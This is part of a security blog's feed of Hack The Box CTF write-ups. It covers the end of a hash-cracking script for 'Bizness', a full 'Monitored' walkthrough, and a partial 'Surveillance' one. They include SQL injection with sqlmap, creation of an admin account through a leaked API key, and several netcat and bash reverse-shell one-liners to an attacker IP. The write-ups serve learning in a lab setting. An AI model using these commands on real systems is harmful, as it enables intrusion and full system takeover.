</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;$</span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>hash_type<span style="color:#e6db74">}</span><span style="color:#e6db74">$</span><span style="color:#e6db74">{</span>salt<span style="color:#e6db74">}</span><span style="color:#e6db74">$</span><span style="color:#e6db74">{</span>base64<span style="color:#f92672">.</span>urlsafe_b64encode(hashed_bytes)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;+&#39;</span>, <span style="color:#e6db74">&#39;.&#39;</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> result
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Example usage:</span>
</span></span><span style="display:flex;"><span>hash_type <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SHA1&#34;</span>
</span></span><span style="display:flex;"><span>salt <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;d&#34;</span>
</span></span><span style="display:flex;"><span>search <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;$SHA1$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I=&#34;</span>
</span></span><span style="display:flex;"><span>wordlist <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/usr/share/wordlists/rockyou.txt&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create an instance of the PasswordEncryptor class</span>
</span></span><span style="display:flex;"><span>encryptor <span style="color:#f92672">=</span> PasswordEncryptor(hash_type)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Iterate through the wordlist and check for a matching password</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(wordlist, <span style="color:#e6db74">&#39;r&#39;</span>, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;latin-1&#39;</span>) <span style="color:#66d9ef">as</span> password_list:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> password <span style="color:#f92672">in</span> password_list:
</span></span><span style="display:flex;"><span>        value <span style="color:#f92672">=</span> password<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>        hashed_password <span style="color:#f92672">=</span> encryptor<span style="color:#f92672">.</span>crypt_bytes(salt, value<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> hashed_password <span style="color:#f92672">==</span> search:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Password found: </span><span style="color:#e6db74">{</span>value<span style="color:#e6db74">}</span><span style="color:#e6db74">, hash: </span><span style="color:#e6db74">{</span>hashed_password<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span></code></pre></div><p>After running the script we find the password to be <code>monkeybizness</code>.</p>
<p><img src="/images/HTB-Bizness/pwd-find.png" alt="Password finder with Python"></p>
<p>We use it to login as root on the target machine with <code>su root</code>.</p>
<p><img src="/images/HTB-Bizness/root-login.png" alt="root login"></p>
<p>The root flag is found at <code>/root/root.txt</code>.</p>
<p><img src="/images/HTB-Bizness/root-flag.png" alt="root flag"></p>
<p>I am not sure I would have made this an &ldquo;Easy&rdquo; machine but I enjoyed this challenge a lot because it helped me polish my scripting and problem solving skills.</p>
]]></content>
        </item>
        
        <item>
            <title>HTB: Monitored</title>
            <link>https://scorpiosec.com/posts/2024/05/htb-monitored/</link>
            <pubDate>Thu, 09 May 2024 21:41:07 -0500</pubDate>
            
            <guid>https://scorpiosec.com/posts/2024/05/htb-monitored/</guid>
            <description>Platform: Hack The Box Link: Monitored Level: Medium OS: Linux Monitored emphasizes rigorous enumeration, the challenge starts with a login form for Nagios XI and directory enumeration leads to the discovery of more and more endpoints. After exhausting all the leads from our nmap TCP scan we make use of a UDP scan to find an exploitable service leading to the leakage of credentials that we use to login. We are able to discover the software version on the target and we leverage CVE-2023-40931 to add a new admin account to the Nagios XI instance to grant us access.</description>
            <content type="html"><![CDATA[<ul>
<li>Platform: Hack The Box</li>
<li>Link: <a href="https://app.hackthebox.com/machines/Monitored" target="_blank" >Monitored</a>

</li>
<li>Level: Medium</li>
<li>OS: Linux</li>
</ul>
<hr>
<p>Monitored emphasizes rigorous enumeration, the challenge starts with a login form for Nagios XI and directory enumeration leads to the discovery of more and more endpoints. After exhausting all the leads from our nmap TCP scan we make use of a UDP scan to find an exploitable service leading to the leakage of credentials that we use to login. We are able to discover the software version on the target and we leverage <code>CVE-2023-40931</code> to  add a new admin account to the Nagios XI instance to grant us access. By executing a command in Nagios XI we gain our initial foothold to recover the user flag, and by manipulating some services we escalate our privileges to find the root flag.</p>
<p>Target IP - <code>10.10.11.248</code></p>
<h2 id="scanning">Scanning</h2>
<pre tabindex="0"><code>nmap -sC -sV -oA nmap/Monitored 10.10.11.248
</code></pre><p><strong>Results</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-04-17 11:55 CDT
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.248
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.051s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">996</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT    STATE SERVICE  VERSION
</span></span><span style="display:flex;"><span>22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp  open  http     Apache httpd 2.4.56
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.56 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to https://nagios.monitored.htb/
</span></span><span style="display:flex;"><span>389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
</span></span><span style="display:flex;"><span>443/tcp open  ssl/http Apache httpd 2.4.56 <span style="color:#f92672">((</span>Debian<span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.56 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| tls-alpn: 
</span></span><span style="display:flex;"><span>|_  http/1.1
</span></span><span style="display:flex;"><span>|_http-title: Nagios XI
</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>nagios.monitored.htb/organizationName<span style="color:#f92672">=</span>Monitored/stateOrProvinceName<span style="color:#f92672">=</span>Dorset/countryName<span style="color:#f92672">=</span>UK
</span></span><span style="display:flex;"><span>| Not valid before: 2023-11-11T21:46:55
</span></span><span style="display:flex;"><span>|_Not valid after:  2297-08-25T21:46:55
</span></span><span style="display:flex;"><span>Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 19.69 seconds
</span></span></code></pre></div><p>Four open ports are found, 22 (SSH), 80 (HTTP with Apache), 389 (LDAP), 443 (HTTPS). We also get redirected to <code>nagios.monitored.htb/</code>.</p>
<pre tabindex="0"><code>sudo echo &#34;10.10.11.248 monitored.htb nagios.monitored.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id="enumeration">Enumeration</h2>
<p>Navigating to <code>https://nagios.monitored.htb/</code> we find a page leading us to a Nagios XI login page after we click on <code>Access Nagios XI</code>.</p>
<p><img src="/images/HTB-Monitored/Nagios-XI.png" alt="Nagios XI"></p>
<p>The url is <code>https://nagios.monitored.htb/nagiosxi/login.php</code>. We lack the credentials to login at this moment.</p>
<p><img src="/images/HTB-Monitored/Nagios-XI-login.png" alt="Nagios-login-XI"></p>
<blockquote>
<p>Nagios is an <strong>Open Source IT system monitoring tool</strong>. It was designed to run on the Linux operating system and can monitor devices running Linux, Windows and Unix OSes.</p>
</blockquote>
<p>We can do some directory enumeration with ffuf. Let&rsquo;s start with <code>https://nagios.monitored.htb/</code>.</p>
<pre tabindex="0"><code>ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 100 -fc 404 -e .php,.html,.txt -u https://nagios.monitored.htb/FUZZ -ic
</code></pre><p><img src="/images/HTB-Monitored/fuzz.png" alt="Subdomain fuzzing"></p>
<p>Visiting <code>https://nagios.monitored.htb/nagios</code> prompt us to log in but we don&rsquo;t have any credentials at this point.</p>
<p><img src="/images/HTB-Monitored/nagios-login.png" alt="Second Nagios Login form"></p>
<p>Next we fuzz <code>https://nagios.monitored.htb/nagiosxi/</code> and multiple results are found.</p>
<pre tabindex="0"><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u &#39;https://nagios.monitored.htb/nagiosxi/FUZZ&#39; -e .php,.html,.txt -ic -fc 404 -c
</code></pre><p><img src="/images/HTB-Monitored/ffuf.png" alt="Ffuf directory enumeration"></p>
<ul>
<li>
<p>Most of these endpoints redirect to the login page probably because we need to be authenticated in order to access them.</p>
</li>
<li>
<p><code>/images</code> and <code>/api</code> return <code>Forbidden</code>.</p>
</li>
</ul>
<p><img src="/images/HTB-Monitored/forbidden.png" alt="Forbidden page"></p>
<ul>
<li><code>/terminal</code> brings up a page titled <code>Shell In A Box</code> where we have access to a terminal in the browser to login into something.</li>
</ul>
<p><img src="/images/HTB-Monitored/terminal.png" alt="Nagios XI terminal endpoint"></p>
<p>Going deeper, <code>/images</code> reveals more results but we don&rsquo;t have the permissions to access them.</p>
<pre tabindex="0"><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u &#39;https://nagios.monitored.htb/nagiosxi/images/FUZZ&#39; -ic -c
</code></pre><p><img src="/images/HTB-Monitored/images-fuzz.png" alt="Images endpoint enumeration"></p>
<p><img src="/images/HTB-Monitored/renewals.png" alt="Images endpoint enumeration - Renewal"></p>
<p>Doing the same thing for <code>/api</code> we find <code>/includes</code> and <code>/v1</code>.</p>
<pre tabindex="0"><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -u &#39;https://nagios.monitored.htb/nagiosxi/api/FUZZ&#39; -ic -c
</code></pre><p><img src="/images/HTB-Monitored/api.png" alt="api endpoint enumeration"></p>
<p><code>includes</code> doesn&rsquo;t give anything useful but <code>v1</code> does returns a few interesting results.</p>
<pre tabindex="0"><code>ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -fc 404 -u &#39;https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ&#39; -ic -fs 32 -fc 403
</code></pre><p><img src="/images/HTB-Monitored/v1-fuzz.png" alt="api endpoint enumeration - v1"></p>
<p>Both <code>license</code> and <code>autheticate</code> return errors.</p>
<p><img src="/images/HTB-Monitored/license.png" alt="api endpoint enumeration - v1 - license"></p>
<p><img src="/images/HTB-Monitored/authenticate.png" alt="api endpoint enumeration - v1 - authenticate"></p>
<p>At this point we have enumerated everything we discovered. So far we have found:</p>
<ul>
<li>
<p>Three login pages:</p>
<ul>
<li><a href="https://nagios.monitored.htb/nagiosxi/" target="_blank" >https://nagios.monitored.htb/nagiosxi/</a>

</li>
<li><a href="https://nagios.monitored.htb/nagiosxi/terminal" target="_blank" >https://nagios.monitored.htb/nagiosxi/terminal</a>

</li>
<li><a href="https://nagios.monitored.htb/nagios" target="_blank" >https://nagios.monitored.htb/nagios</a>

</li>
</ul>
</li>
<li>
<p>An authentication endpoint at <a href="https://nagios.monitored.htb/nagiosxi/api/v1/authenticate" target="_blank" >https://nagios.monitored.htb/nagiosxi/api/v1/authenticate</a>

</p>
</li>
</ul>
<p>It is clear that we need some credentials to access the target system.</p>
<blockquote>
<p>Although UDP scans are rarely needed in CTFs, we should be as thorough as possible with our scanning. I scratched my head for a long time because I forgot about UDP scans.</p>
</blockquote>
<p>Let&rsquo;s try a UDP scan.</p>
<pre tabindex="0"><code>sudo nmap -sU -sC -sV -vv 10.10.11.248
</code></pre><blockquote>
<p>This command will produce a lot of output and keep in mind that UDP scan are usually slower.</p>
</blockquote>
<p><img src="/images/HTB-Monitored/udp-scan.png" alt="nmap UDP scan"></p>
<p>Four ports will be discovered:</p>
<ul>
<li>68 - DHCP</li>
<li>123 - NTP</li>
<li>161 - SNMPv1</li>
<li>162 - SNMPv3</li>
</ul>
<p>The most likely way to exploitation is SNMP. We can use <code>snmpwalk</code> to enumerate the service. We note that two versions of SNMP are used here, we will specify <code>SNMP V1</code> since it&rsquo;s less secure.</p>
<blockquote>
<p>The command below creates a lot of output on the terminal so I sent it to a file.</p>
</blockquote>
<pre tabindex="0"><code>snmpwalk -c public -v1 -t 10 10.10.11.248 &gt; snmp.txt
</code></pre><p>Going over the output we find some lines referencing a script <code>/opt/scripts/check_host.sh</code> with what seems to look like some credentials <code>svc:XjH7VCehowpR1xZB</code>.</p>
<p><img src="/images/HTB-Monitored/creds-snmp.png" alt="SNMP potential credentials"></p>
<p>The credentials did not work on <code>https://nagios.monitored.htb/nagiosxi/terminal/</code> and we get the message that this user account is either disabled or non-existent at <code>https://nagios.monitored.htb/nagiosxi/login.php</code>.</p>
<p><img src="/images/HTB-Monitored/nagiosxi-login-attempt.png" alt="NagiosXI login attempt failed"></p>
<h2 id="initial-foothold">Initial Foothold</h2>
<p>At <code>https://nagios.monitored.htb/nagios</code> we are able to login. On that page we see a PID and the software version. Trying to reuse the cookie value from this page on <code>/nagiosxi</code> also fails.</p>
<p><img src="/images/HTB-Monitored/nagios-core.png" alt="NagiosXI login attempt successful"></p>
<p>Searching for vulnerabilities for that specific software version we end finding <a href="https://outpost24.com/blog/nagios-xi-vulnerabilities/" target="_blank" >three CVEs</a>

. They all allow users, with various levels of privileges, to access database fields via SQL injections.</p>
<p><img src="/images/HTB-Monitored/nagios-vulns.png" alt="NagiosXI vulnerabilities"></p>
<p>We find a good explanation for the vulnerability in the post.</p>
<p><img src="/images/HTB-Monitored/CVE-2023-40931-EXPLAINED.png" alt="CVE-2023-40931-EXPLAINED"></p>
<p>We recall that back on the <code>/api/v1/authenticate</code> we saw the message <code>You can only use POST with authenticate.</code></p>
<ol>
<li>We send a POST request to that endpoint with the credentials of the user and receive a token</li>
</ol>
<pre tabindex="0"><code>curl -k -L -X POST &#34;https://nagios.monitored.htb/nagiosxi/api/v1/authenticate&#34; -d &#34;username=svc&amp;password=XjH7VCehowpR1xZB&#34;
</code></pre><p><img src="/images/HTB-Monitored/token-retrieval.png" alt="Token retrieval"></p>
<ol start="2">
<li>We use this token to launch an SQL injection</li>
</ol>
<pre tabindex="0"><code>sqlmap -u &#34;https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&amp;id=3&amp;token=895ab920b8c2b4196e16ee5c4f6c4470fbd77bae&#34; -p id --level 5 --risk 3 --dump 
</code></pre><p>Once you see <code>GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]</code> enter <code>N</code>.</p>
<p><img src="/images/HTB-Monitored/sqlmap.png" alt="SQLmap command"></p>
<p>SQLmap will start dumping all the tables of the database on the terminal but we can inspect the tables we are interested in by going to <code>/home/&lt;YOUR_USERNAME&gt;/.local/share/sqlmap/output/nagios.monitored.htb/dump/</code>. We know that the exploit is related to the tables <code>xi_session</code> and <code>xi_users</code>.</p>
<p><img src="/images/HTB-Monitored/tables-dumped.png" alt="SQLmap tables dump"></p>
<p>You can also scroll through the output on the terminal and find the <code>xi_users</code> table dump. We find the API key for the <code>Nagios Administrator</code> user <code>IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL</code>.</p>
<p><img src="/images/HTB-Monitored/API-key.png" alt="API key found"></p>
<blockquote>
<p>Passwords hashes are also present in the dump but we are unable to crack them.</p>
</blockquote>
<p>Still we don&rsquo;t have any valid credentials to login into Nagios XI and there is no way to sign up. Our only option is to find how to add a new account.</p>
<p>After some research we find how to add new users via the API <a href="https://support.nagios.com/forum/viewtopic.php?t=42923" target="_blank" >here</a>

 and on <a href="https://support.nagios.com/forum/viewtopic.php?f=6&amp;t=40502" target="_blank" >this</a>

 page we also find that we can add an admin account by using the <code>auth_level</code> parameter.</p>
<p><img src="/images/HTB-Monitored/nagiosxi-api.png" alt="NagiosXI add users via API"></p>
<p>The command below is used to create a new admin user.  The <code>username</code>, <code>email</code>, <code>name</code>, and <code>password</code> fields are required.</p>
<pre tabindex="0"><code>curl -k &#34;https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&amp;pretty=1&#34; -d &#34;username=adminsec&amp;password=password123&amp;name=kscorpio&amp;email=kscorpio@monitored.htb&amp;auth_level=admin&#34;
</code></pre><p><img src="/images/HTB-Monitored/user-created.png" alt="User added via API successfully"></p>
<p>With the account newly created we are able to log into Nagios XI at <code>https://nagios.monitored.htb/nagiosxi/</code></p>
<blockquote>
<p>You will be asked to change the password once you login.</p>
</blockquote>
<p><img src="/images/HTB-Monitored/nagiosxi-login.png" alt="NagiosXI login success"></p>
<p>On the Dashboard, hover on the <code>Configure</code> menu and select <code>Core Config Manager</code>.</p>
<p><img src="/images/HTB-Monitored/nagiosxi-config.png" alt="NagiosXI config"></p>
<p>Select <code>Commands</code> and then <code>Add New</code>.</p>
<p><img src="/images/HTB-Monitored/config-cmd.png" alt="Core Config Manager"></p>
<p><img src="/images/HTB-Monitored/new-cmd.png" alt="Add new command"></p>
<p>Add a reverse shell command and save it.  For example: <code>bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;IP_Address&gt;/&lt;Port&gt; 0&gt;&amp;1'</code></p>
<p><img src="/images/HTB-Monitored/rev-shell-cmd.png" alt="Reverse shell command"></p>
<p>You also have to click <code>Apply Configuration</code> for the new command to be listed. Now you should see <code>149 Commands</code>.</p>
<p><img src="/images/HTB-Monitored/apply-config.png" alt="Apply configuration"></p>
<p>Let&rsquo;s start a listener on the port specified in our command.</p>
<p>To run the command go to <code>Monitoring</code> &gt; <code>Hosts</code> &gt; click on <code>localhost</code>.</p>
<p><img src="/images/HTB-Monitored/localhost.png" alt="Configuration - localhost"></p>
<p>Under <code>Check command</code>, select your command and click <code>Run Check Command</code> and you will get a connection on your listener.</p>
<p><img src="/images/HTB-Monitored/nagios-shell.png" alt="Initial Foothold"></p>
<p>You can get the user flag at <code>/home/nagios/user.txt</code>.</p>
<p><img src="/images/HTB-Monitored/user-flag.png" alt="User flag"></p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<p>Running <code>sudo -l</code> we discover that the user can manipulate two services <code>nagios</code> and <code>npcd</code> in addition to running various scripts.</p>
<p><img src="/images/HTB-Monitored/sudo-l.png" alt="sudo -l command"></p>
<blockquote>
<p>The npcd service in Nagios is a <strong>daemon</strong> responsible for processing <strong>performance data</strong> received from Nagios checks.</p>
</blockquote>
<p>Using the <code>find</code> command we get the exact locations of <code>nagios</code> and <code>npcd</code>.</p>
<pre tabindex="0"><code>find / -name nagios 2&gt; /dev/null

find / -name npcd 2&gt; /dev/null
</code></pre><p><img src="/images/HTB-Monitored/services-location.png" alt="services locations"></p>
<p>We also check the permissions of the binaries and we notice that we have write permission for  <code>npcd</code>. We can edit the file content and replace it with a malicious command to get a shell.</p>
<p><img src="/images/HTB-Monitored/binaries-perms.png" alt="Binaries permissions"></p>
<ol>
<li>Stop the service</li>
</ol>
<pre tabindex="0"><code>sudo /usr/local/nagiosxi/scripts/manage_services.sh stop npcd
</code></pre><ol start="2">
<li>Edit <code>npcd</code></li>
</ol>
<pre tabindex="0"><code>echo &#39;#!/bin/bash&#39; &gt; /usr/local/nagios/bin/npcd

echo &#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.15.4 5555 &gt;/tmp/f&#39; &gt;&gt; /usr/local/nagios/bin/npcd
</code></pre><ol start="3">
<li>Start a listener and start the <code>npcd</code> service using the script.</li>
</ol>
<pre tabindex="0"><code>sudo /usr/local/nagiosxi/scripts/manage_services.sh start npcd
</code></pre><p>We get a root shell on our listener and we can read the root flag at <code>/root/root.txt</code>.</p>
<p><img src="/images/HTB-Monitored/root-flag.png" alt="Root flag"></p>
<p>Monitored was a fun challenge forcing me to up my scanning and enumeration game, this was the first time I had to use a UDP scan for a CTF. I hope this write up was helpful! If you have any questions you can leave a comment (which requires a Github account) or you can reach out on Twitter at <a href="https://twitter.com/_KScorpio" target="_blank" >_KScorpio</a>

.</p>
]]></content>
        </item>
        
        <item>
            <title>HTB: Surveillance</title>
            <link>https://scorpiosec.com/posts/2024/04/htb-surveillance/</link>
            <pubDate>Fri, 19 Apr 2024 15:48:38 -0500</pubDate>
            
            <guid>https://scorpiosec.com/posts/2024/04/htb-surveillance/</guid>
            <description>Platform: Hack The Box Link: Surveillance Level: Medium OS: Linux Surveillance begins with the discovery of a web application running on port 80, after identifying the software version, we use CVE-2023-41892 to gain initial access. Through further exploration, we find a database backup leaking the user name and password hash for an admin user, which we utilize to SSH into the system and uncover an internal service. Leveraging SSH tunneling, we access the service and make use of CVE-2023-26035 to exploit it.</description>
            <content type="html"><![CDATA[<ul>
<li>Platform: Hack The Box</li>
<li>Link: <a href="https://app.hackthebox.com/machines/Surveillance" target="_blank" >Surveillance</a>

</li>
<li>Level: Medium</li>
<li>OS: Linux</li>
</ul>
<hr>
<p>Surveillance begins with the discovery of a web application running on port 80, after identifying the software version, we use CVE-2023-41892 to gain initial access. Through further exploration, we find a database backup leaking the user name and password hash for an admin user, which we utilize to SSH into the system and uncover an internal service. Leveraging SSH tunneling, we access the service and make use of CVE-2023-26035 to exploit it. Eventually, by exploiting vulnerabilities in certain scripts, we escalate our privileges and gain access to the root account.</p>
<p>Target IP - <code>10.10.11.245</code></p>
<h2 id="scanning">Scanning</h2>
<pre tabindex="0"><code>nmap -sC -sV -oA nmap/Surveillance 10.10.11.245
</code></pre><p><strong>Results</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-04-14 12:04 CDT
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.245
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.044s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://surveillance.htb/
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 9.52 seconds
</span></span></code></pre></div><p>We have two open ports 22 (SSH) and 80 (HTTP - nginx), we are also redirected to <code>http://surveillance.htb/</code>.</p>
<pre tabindex="0"><code>sudo echo &#34;10.10.11.245 surveillance.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id="enumeration">Enumeration</h2>
<p>The website is for a company offering security services but it does not offer any exploitable features.</p>
<p><img src="/images/HTB-Surveillance/surveillance-website.png" alt="Surveillance website"></p>
<p>With <code>Wappalyzer</code> we discovered that the website is using <code>Craft CMS</code>. Going through the source code we find that the version running is <code>4.4.14</code>.</p>
<p><img src="/images/HTB-Surveillance/Wappalyzer.png" alt="Wappalyzer results"></p>
<p><img src="/images/HTB-Surveillance/Craft-CMS-version.png" alt="Craft CMS version"></p>
<p>Searching for vulnerabilities leads to <a href="https://www.exploit-db.com/exploits/51918" target="_blank" >CVE-2023-41892</a>

 allowing for unauthenticated remote code execution. A PoC is available <a href="https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce" target="_blank" >here</a>

.</p>
<blockquote>
<p>In my experience the PoC above does not properly work sometimes, if this happens to you use <a href="https://github.com/Faelian/CraftCMS_CVE-2023-41892" target="_blank" >this one</a>

 instead.</p>
</blockquote>
<h2 id="initial-foothold">Initial Foothold</h2>
<p>After running the script we get a shell.</p>
<p><img src="/images/HTB-Surveillance/foothold.png" alt="Surveillance initial foothold"></p>
<p>We seem to be unable to upgrade it so let&rsquo;s redirect it to a netcat listener.</p>
<pre tabindex="0"><code>nc -lvnp 4444
</code></pre><p>Run the command below on the target (copy it all and paste it in your terminal)</p>
<pre tabindex="0"><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.15.4 4444 &gt;/tmp/f 
/usr/bin/script -qc /bin/bash /dev/null
</code></pre><p><img src="/images/HTB-Surveillance/revshell.png" alt="Reverse shell transfer"></p>
<p>We then upgrade the shell we obtain via our listener.</p>
<pre tabindex="0"><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
export TERM=xterm
Ctrl + Z
stty raw -echo; fg
stty rows 38 columns 116
</code></pre><p><img src="/images/HTB-Surveillance/new-shell.png" alt="New shell"></p>
<p>For the system enumeration, we run <code>linpeas</code>. We note that <code>mysql</code> is running on the target.</p>
<p><img src="/images/HTB-Surveillance/mysql.png" alt="MySQL service"></p>
<p><img src="/images/HTB-Surveillance/mysql1.png" alt="MySQL version"></p>
<p>We also find credentials for the MySQL instance.</p>
<p><img src="/images/HTB-Surveillance/Craft-db-pwd.png" alt="MySQL credentials"></p>
<blockquote>
<p>We end up finding a <code>craftdb</code> database, with a table named <code>users</code> but we cannot crack the hashes found there.</p>
</blockquote>
<p>A backup of the database is also found on the target in <code>/var/www/html/craft/storage/backups/</code>.</p>
<p><img src="/images/HTB-Surveillance/files.png" alt="FIles found by linpeas"></p>
<p>The archive is sent to our local machine, after unzipping it and checking its content we find a hash for the user <code>Matthew</code> which is an admin.</p>
<blockquote>
<p>If you run <code>cat /etc/passwd</code> on the target you will indeed see the user <code>matthew</code>.</p>
</blockquote>
<p><img src="/images/HTB-Surveillance/matthew.png" alt="matthew user"></p>
<p>Using <a href="https://crackstation.net/" target="_blank" >CrackStation</a>

 we confirm that it is a sha256 hash and successfully crack it to recover the password <code>starcraft122490</code>.</p>
<p><img src="/images/HTB-Surveillance/matthew-pwd.png" alt="matthew user password"></p>
<p>With the credentials <code>matthew:starcraft122490</code> we log in via SSH and get the user flag.</p>
